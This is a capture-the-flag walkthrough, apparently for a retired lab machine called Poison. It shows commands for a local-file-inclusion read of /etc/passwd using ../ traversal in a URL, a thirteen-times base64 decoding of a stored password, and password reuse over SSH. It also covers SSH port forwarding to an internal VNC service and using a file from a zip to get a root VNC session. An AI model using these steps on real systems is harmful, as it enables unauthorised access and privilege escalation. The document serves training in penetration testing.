#box #base64 #password #LFI #vnc #vncviewer #password-reuse #portForwarding 
1. The machine presents on port 80 a basic application that shows up php scripts coming from a list of available php files listed aboev
![[attachments/poison-1.png]]
2. While the website is also vulnerable to LFI, it's enough to use the `listfiles.php` script to discover an available file named `pwdbackup.txt`
![[attachments/poison-2.png]]
3. Print this content shows us that the password seems to be a base64 blob which, as mentioned above, has been encoded 'atleast 13 times'
![[attachments/poison-3.png]]
4. So we proceed to decode the base64 13 times by piping the hash 13 times, obtaining the password `Charix!2#4%6&8(0`
```sh
echo "Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVUbGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBSbVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVWM040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRsWmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYyeG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01GWkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYwMXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVaT1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5kWFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZkWGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZTVm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZzWkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBWVmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpOUkd4RVdub3dPVU5uUFQwSwo=" | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d
```
5. Now, we've also discovered the application is vulnerable to LFI and a quick search onto `/etc/passwd` tells us that the only user which has shell access is an user named `charix`
```sh
curl -s http://10.129.1.254/browse.php?file=../../../../../../etc/passwd | grep sh
```
![[attachments/poison-4.png]]
6. At this point, we try to authenticate in SSH with `charix:Charix!2#4%6&8(0` succceding. Inside the machine, we discover that it's a FreeBSD so the commands are slightly different from a common linux machine. We discover with `sockstat -l4` (analogous of `netstat -ano`) that a service running on port `5901` is present. That service refers to VNC (Virtual Network Computing) and it's used as an alternative to RDP. Since it's listening on the internal network we start a local port forwarding with `ssh`
```sh
ssh -L 5901:localhost:5901 charix@10.129.1.254
```
7. Once we can reach the service from our end with the following command, but the session asks us for a password
```sh
vncviewer 127.0.0.1:5901
```
![[attachments/poison-5.png]]
8. We discover on the `/home/charix` directory a `secret.zip` file. We proceed to download it on our end with `scp`
```sh
scp charix@10.129.1.254:/home/charix/secret.zip secret.zip
```
9. Finally, we try to crack it with `john` but unsuccessfully. We consider the idea of using the same password discover before to unzip the content, succeeding. Inside the zip, a binary file is present. Printing it with `xxd` doesn't return us anything that makes sense, but using it as a `-passwd` file for `vncviewer` gives us a root shell by connecting the the available VNC Desktop
```sh
vncviewer 127.0.0.1:5901 -passwd secret
```
![[attachments/poison-6.png]]
